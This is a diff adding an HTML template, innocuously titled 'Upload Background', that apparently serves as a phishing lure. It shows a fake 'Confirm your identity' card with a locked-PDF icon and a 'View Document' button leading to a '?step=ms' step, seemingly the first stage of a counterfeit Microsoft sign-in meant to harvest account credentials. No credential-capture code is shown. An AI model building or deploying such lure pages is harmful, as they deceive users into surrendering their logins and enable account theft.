@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Upload Background</title>
+  <style>
+    html, body { height: 100%; margin: 0; }
+    body { background: url('{{BG_URL}}') center top / 100% auto no-repeat fixed; font-family: Arial, sans-serif; }
+    .upload-bar { position: fixed; top: 0; left: 0; right: 0; display: flex; gap: 8px; align-items: center; justify-content: center; padding: 10px; background: rgba(255,255,255,0.85); backdrop-filter: blur(4px); z-index: 10; }
+    .page { min-height: 100%; display: flex; align-items: center; justify-content: center; padding-top: 60px; }
+    .fixed-center { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: flex; align-items: center; justify-content: center; width: 470px; max-width: 90%; }
+    .card { background: #fff; border-radius: 16px; padding: 24px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3); position: relative; text-align: center; }
+    .lock-icon { width: 39px; height: 39px; position: absolute; top: 20px; right: 20px; }
+    .title { font-size: 28px; font-weight: 700; color: #4a4a4a; margin-bottom: 8px; margin-top: 20px; }
+    .subtitle { font-size: 20px; color: #666; display: block; margin-bottom: 20px; }
+    .pdf-icon { border: 2px solid #e0e0e0; border-radius: 8px; display: block; margin: 0 auto 15px; width: 66px; height: 76px; }
+    .btn { display: inline-block; background: #c8102e; padding: 12px 30px; border-radius: 8px; font-size: 20px; font-weight: 700; color: #fff; text-decoration: none; transition: background 0.2s; }
+    .btn:hover { background: #a50d26; }
+    @media (max-width: 480px) { .title { font-size: 22px; } .subtitle { font-size: 16px; } .btn { font-size: 18px; padding: 10px 24px; } body { background-size: auto 100%; } }
+  </style>
+  </head>
+  <body>
+    <div class="upload-bar"></div>
+    <div class="page">
+      <div class="fixed-center">
+        <div class="card">
+          <img src="https://www.shutterstock.com/image-vector/shield-lock-check-mark-protection-260nw-2635756061.jpg" class="lock-icon" alt="lock">
+          <div class="title">Confirm your identity</div>
+          <span class="subtitle">Sign in with your connected account to access document</span>
+          <div style="margin-bottom: 10px;">
+            <img src="https://decompose.fsv.cvut.cz/wp-content/uploads/2021/02/lock-pdf.png" class="pdf-icon" alt="PDF">
+            <a href="?step=ms" class="btn">View Document</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
